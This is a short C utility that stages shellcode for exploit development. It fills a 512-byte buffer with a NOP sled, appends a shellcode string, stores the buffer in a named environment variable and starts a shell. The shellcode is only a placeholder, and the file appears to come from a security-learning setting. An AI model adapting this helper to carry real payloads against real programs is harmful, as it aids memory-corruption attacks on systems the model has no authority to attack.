#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define NOP 0x90

char shellcode[] =
    "shellcode goes here";


int main(int argc, char *argv[]) {

    if (argc != 2 && argc != 3) {
	printf("Usage: %s <var_name> [<path_to_shell>]\n\n", argv[0]);
	printf("Load the shellcode into the environment variable <var_name>\n");
	printf("and start a new shell specified by <path_to_shell> (default to sh)\n");
	exit(EXIT_SUCCESS);
    }

    char shell[512];
    memset(shell, NOP, 512);
    memcpy(&shell[512 - strlen(shellcode)], shellcode, strlen(shellcode));
    setenv(argv[1], shell, 1);
    printf("Loaded shellcode into %s\n", argv[1]);

    if (argc == 3)
	system(argv[2]);
    else
	system("sh");

    return EXIT_SUCCESS;
}
